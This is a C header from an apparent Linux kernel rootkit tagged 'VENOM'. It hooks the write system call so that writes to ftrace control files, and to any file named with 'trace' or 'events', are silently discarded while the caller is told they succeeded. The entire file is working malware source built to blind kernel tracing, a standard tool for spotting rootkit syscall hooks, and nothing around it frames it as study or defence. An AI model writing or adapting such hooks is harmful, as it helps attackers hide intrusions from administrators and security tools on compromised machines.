#ifndef WRITE_H
#define WRITE_H

#include "../include/headers.h"

static asmlinkage ssize_t (*orig_write)(const struct pt_regs *regs);


notrace static asmlinkage ssize_t hooked_write(const struct pt_regs *regs) {
    int fd = regs->di;
    const char __user *user_buf = (const char __user *)regs->si;
    size_t count = regs->dx;
    char *kernel_buf;
    struct file *file;
    
    file = fget(fd);
    if (file) {
        if (file->f_path.dentry && file->f_path.dentry->d_name.name) {
            const char *name = file->f_path.dentry->d_name.name;
            
            if (strcmp(name, "ftrace_enabled") == 0 ||
                strcmp(name, "tracing_on") == 0 ||
                strcmp(name, "trace") == 0 ||
                strcmp(name, "available_tracers") == 0 ||
                strcmp(name, "current_tracer") == 0) {
                
                fput(file);
                
                kernel_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);
                if (kernel_buf && count < BUFFER_SIZE) {
                    if (copy_from_user(kernel_buf, user_buf, count) == 0) {
                        kernel_buf[count] = '\0';
                        printk(KERN_DEBUG "[VENOM] Blocked write to %s: %.*s\n", 
                               name, (int)count, kernel_buf);
                    }
                    kfree(kernel_buf);
                }
                
                return count;
            }
            
            if (strstr(name, "trace") || strstr(name, "events")) {
                fput(file);
                printk(KERN_DEBUG "[VENOM] Blocked write to trace file: %s\n", name);
                return count;
            }
        }
        fput(file);
    }
    
    return orig_write(regs);
}

#endif 
